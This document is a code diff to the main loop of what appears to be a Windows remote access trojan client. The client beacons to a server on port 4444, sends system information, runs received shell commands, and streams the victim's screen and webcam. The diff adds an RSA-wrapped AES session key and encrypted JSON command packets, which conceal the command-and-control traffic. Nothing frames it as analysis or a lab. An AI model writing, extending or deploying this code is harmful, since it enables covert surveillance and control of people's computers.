@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <process.h>
 #include "utils.h"
+#include "cJSON.h"
 #include "sysinfo.h"
 #include "shell.h"
 #include "tasks.h"
@@ -19,6 +20,7 @@
 #define PORT 4444
 int g_reconnect_delay = 5000;
 
+SessionKey g_session;
 SOCKET g_sock = INVALID_SOCKET;
 HANDLE g_send_mutex = NULL;
 HANDLE g_screen_stop = NULL;
@@ -154,47 +156,97 @@ int main() {
             continue;
         }
 
-        char sysinfo_msg[4096];
-        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "[sysinfo]%s\n", info);
-        send(g_sock, sysinfo_msg, (int)strlen(sysinfo_msg), 0);
+        // 1. Handshake: Generate AES key/IV and send encrypted with RSA
+        HCRYPTPROV hProv;
+        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
+        CryptGenRandom(hProv, 32, g_session.key);
+        CryptGenRandom(hProv, 16, g_session.iv);
+        CryptReleaseContext(hProv, 0);
 
-        char buf[1024];
+        unsigned char session_data[48];
+        memcpy(session_data, g_session.key, 32);
+        memcpy(session_data + 32, g_session.iv, 16);
+
+        char* encrypted_hs = rsa_encrypt_pkcs1(session_data, 48, RSA_PUB_KEY);
+        if (encrypted_hs) {
+            cJSON* hs_root = cJSON_CreateObject();
+            cJSON_AddStringToObject(hs_root, "session", encrypted_hs);
+            char* hs_json = cJSON_PrintUnformatted(hs_root);
+            char hs_buf[2048];
+            _snprintf(hs_buf, sizeof(hs_buf), "%s\n", hs_json);
+            send(g_sock, hs_buf, (int)strlen(hs_buf), 0);
+            free(hs_json);
+            cJSON_Delete(hs_root);
+            free(encrypted_hs);
+        }
+
+        char sysinfo_msg[4096];
+        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "[sysinfo]%s", info);
+        sock_send(g_sock, g_send_mutex, sysinfo_msg);
+
+        char buf[8192];
         int n;
         while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
             buf[n] = 0;
             char* saveptr;
             char* line = strtok_r(buf, "\n", &saveptr);
             while (line) {
-                CommandArgs* ca = malloc(sizeof(CommandArgs));
-                strncpy(ca->cmd, line, sizeof(ca->cmd) - 1);
-                ca->cmd[sizeof(ca->cmd) - 1] = 0;
+                cJSON* packet = cJSON_Parse(line);
+                if (packet) {
+                    cJSON* data = cJSON_GetObjectItem(packet, "data");
+                    cJSON* iv_b64 = cJSON_GetObjectItem(packet, "iv");
+                    if (data && iv_b64) {
+                        size_t iv_len;
+                        unsigned char* iv = base64_decode(iv_b64->valuestring, strlen(iv_b64->valuestring), &iv_len);
+                        size_t plain_len;
+                        unsigned char* decrypted = aes_256_cbc_decrypt(data->valuestring, &plain_len, g_session.key, iv);
+                        if (decrypted) {
+                            decrypted[plain_len] = 0;
+                            cJSON* msg = cJSON_Parse((char*)decrypted);
+                            if (msg) {
+                                cJSON* type = cJSON_GetObjectItem(msg, "type");
+                                cJSON* payload = cJSON_GetObjectItem(msg, "payload");
+                                if (type && strcmp(type->valuestring, "ping") == 0) {
+                                    sock_send(g_sock, g_send_mutex, "pong");
+                                } else if (type && strcmp(type->valuestring, "command") == 0 && payload) {
+                                    char* cmd_val = payload->valuestring;
 
-                if (strncmp(line, "[screen_start]", 14) == 0) {
-                    int fps = atoi(line + 14);
-                    if (g_screen_stop) {
-                        SetEvent(g_screen_stop);
-                        Sleep(100); // Give time for thread to see event
-                        CloseHandle(g_screen_stop);
+                                    if (strncmp(cmd_val, "[screen_start]", 14) == 0) {
+                                        int fps = atoi(cmd_val + 14);
+                                        if (g_screen_stop) {
+                                            SetEvent(g_screen_stop);
+                                            Sleep(100);
+                                            CloseHandle(g_screen_stop);
+                                        }
+                                        g_screen_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
+                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
+                                        sa->fps = fps;
+                                        _beginthread(screen_thread, 0, sa);
+                                    } else if (strncmp(cmd_val, "[cam_start]", 11) == 0) {
+                                        int fps = atoi(cmd_val + 11);
+                                        if (g_camera_stop) {
+                                            SetEvent(g_camera_stop);
+                                            Sleep(100);
+                                            CloseHandle(g_camera_stop);
+                                        }
+                                        g_camera_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
+                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
+                                        sa->fps = fps;
+                                        _beginthread(camera_thread, 0, sa);
+                                    } else {
+                                        CommandArgs* ca = malloc(sizeof(CommandArgs));
+                                        strncpy(ca->cmd, cmd_val, sizeof(ca->cmd) - 1);
+                                        ca->cmd[sizeof(ca->cmd) - 1] = 0;
+                                        _beginthread(handle_command, 0, ca);
+                                    }
+                                }
+                                cJSON_Delete(msg);
+                            }
+                            free(decrypted);
+                        }
+                        free(iv);
                     }
-                    g_screen_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
-                    StreamArgs* sa = malloc(sizeof(StreamArgs));
-                    sa->fps = fps;
-                    _beginthread(screen_thread, 0, sa);
-                    free(ca);
-                } else if (strncmp(line, "[cam_start]", 11) == 0) {
-                    int fps = atoi(line + 11);
-                    if (g_camera_stop) {
-                        SetEvent(g_camera_stop);
-                        Sleep(100);
-                        CloseHandle(g_camera_stop);
-                    }
-                    g_camera_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
-                    StreamArgs* sa = malloc(sizeof(StreamArgs));
-                    sa->fps = fps;
-                    _beginthread(camera_thread, 0, sa);
-                    free(ca);
-                } else {
-                    _beginthread(handle_command, 0, ca);
+                    cJSON_Delete(packet);
                 }
                 line = strtok_r(NULL, "\n", &saveptr);
             }
